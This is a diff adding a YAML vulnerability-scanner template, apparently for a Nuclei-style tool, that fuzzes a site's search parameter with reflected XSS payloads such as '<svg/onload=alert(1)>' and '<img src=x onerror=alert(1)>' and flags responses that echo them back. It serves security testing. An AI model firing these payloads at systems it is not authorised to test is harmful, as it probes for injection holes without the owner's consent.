@@ -1,0 +1,29 @@
+id: xss-search-fuzz
+
+info:
+  name: Reflected XSS Search Fuzz
+  author: moriarty
+  severity: medium
+  description: Exercises search endpoints with common XSS payloads using the auto_fuzz engine.
+  tags: xss,fuzzing,reflection
+
+requests:
+  - method: GET
+    path:
+      - "/search?q={{payload}}"
+    auto_fuzz:
+      payload:
+        - xss
+        - "<svg/onload=alert(1)>"
+        - "<img src=x onerror=alert(1)>"
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "<svg/onload=alert"
+          - "onerror=alert"
+      - type: regex
+        part: body
+        regex:
+          - '<script>.*alert\(1\)'
